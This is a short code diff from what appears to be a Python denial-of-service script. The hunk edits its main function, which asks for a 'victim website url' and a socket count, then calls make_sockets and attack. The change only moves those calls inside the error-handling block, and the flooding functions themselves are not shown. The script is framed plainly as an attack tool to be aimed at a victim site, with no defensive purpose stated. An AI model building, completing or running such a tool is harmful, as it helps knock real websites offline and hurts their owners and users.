@@ -73,11 +73,10 @@ def main():
     target = input("Enter victim website url: ") # The target website for the attack
     try:
         max_sockets = int(input("Enter the max number of sockets (Try 200 if unsure): ")) # The max number of sockets that will be made.
+        list_of_sockets = make_sockets(max_sockets, target)
+        attack(list_of_sockets, max_sockets, target)
     except:
         print("Error: Max number of sockets is invalid")
-        return
-    list_of_sockets = make_sockets(max_sockets, target)
-    attack(list_of_sockets, max_sockets, target)
 
 if __name__ == "__main__":
     main()
